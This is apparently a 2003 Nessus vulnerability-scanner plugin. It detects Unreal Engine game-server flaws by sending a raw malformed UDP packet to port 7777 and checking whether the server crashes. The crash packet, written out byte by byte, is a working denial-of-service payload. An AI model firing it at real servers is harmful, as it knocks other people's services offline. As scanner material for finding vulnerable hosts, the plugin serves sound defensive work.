#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Details: http://www.pivx.com/luigi/adv/ueng-adv.txt
#
# We simply crash the remote server (and only test for BID 6770, although
# everything should be corrected by the same patch). I don't really care
# because after all, it's just a game.
#
#

if(description)
{
 script_id(11228);
 script_bugtraq_id(6770, 6771, 6772, 6773, 6774, 6775);
 script_version ("$Revision: 1.1 $");
 
 name["english"] = "Unreal Engine flaws";

 script_name(english:name["english"]);

    desc["english"] = "
The remote host was running a game server with the
Unreal Engine on it.
 
 
This engine is vulnerable to various attacks which may allow
an attacker to use it as a distributed denial of service 
source, or to execute arbitrary code on this host.

*** Note that Nessus disabled this service by testing for
*** this flaw


Solution : Epic is supposed to release a patch shortly
Risk factor : High

See also: http://www.pivx.com/luigi/adv/ueng-adv.txt";


 script_description(english:desc["english"]);
 

 summary["english"] = "Crashes the remote Unreal Engine Game Server";
 
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
 				francais:"Ce script est Copyright (C) 2003 Renaud Deraison");

 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 exit(0);
}

port = 7777; # Only seen it on this port

function ping()
{
packet = string("None", raw_string(0));
soc = open_sock_udp(port);
send(socket:soc, data:packet);
r = recv(socket:soc, length:4096);
if(r)return(1);
else return(0);
}


function crash()
{
packet = raw_string(
0x00, 
0x80, 0x05, 0x20, 0x80, 0xe0, 0x04, 0x78, 0xaf, 
0xf8, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x40);

soc = open_sock_udp(port);
send(socket:soc, data:packet);
r = recv(socket:soc, length:4096);
if(r)return(1);
else return(0);
}


if(ping())
{
 crash();
 if(!ping())security_hole(port);
}
